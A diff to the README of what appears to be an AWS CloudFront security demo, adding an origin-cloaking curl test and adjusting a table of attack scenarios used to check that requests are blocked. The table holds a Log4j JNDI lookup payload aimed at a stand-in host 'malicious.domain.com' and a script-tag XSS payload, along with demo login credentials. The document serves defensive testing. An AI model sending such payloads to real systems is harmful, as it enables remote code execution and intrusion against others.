@@ -16,7 +16,7 @@ npm install
 cdk deploy
 ```
 
-Note the generated CloudFront domain name, you will use it in the test scenarios.
+Note the generated CloudFront domain name, and the load balancer domain name, you will use them in the test scenarios.
 
 # Architecture
 
@@ -43,8 +43,9 @@ fields @timestamp, @message
 
 | Test scenario  | Threat category  | How to test | 
 |:------------- |:--------------- | :-------------|
+| Verify origin cloaking |**Protection bypass**| The Load balancer's security group is configured with CloudFront prefixlist, and the IP of the developer machine that deployed the CDK stack. On this developer machine, run the following curl command, and verify it works. Then go to Cloudshell in the AWS Console, and run the same command, and verify that the TCP connection was refused. <br/> ```curl -I http://xxxxxxxxx.xxxxx.elb.amazonaws.com```| 
 | Exploit Log4j CVE | **Vulnerability exploit** | Load the following page with malicious payload, and verify that the request is blocked with 403 error code: <br/>  ```https://xxxxxxxx.cloudfront.net/product/${jndi:ldap://malicious.domain.com/}``` |
-| Post malicious XSS payload | **Cross Site Scripting** | Login in (usr: Joud, pwd: demo), then load any product page to post the following comment with an XSS payload, and verify that the request is blocked with 403 error code: <br/> ```<script><alert>Hello></alert></script>``` |
+| Post malicious XSS payload | **Cross Site Scripting** | Login in (user: Joud, pwd: demo), then load any product page to post the following comment with an XSS payload, and verify that the request is blocked with 403 error code: <br/> ```<script><alert>Hello></alert></script>``` |
 
 | Threat category  | Test scenario  | How to test | 
 |:------------- |:--------------- | :-------------|
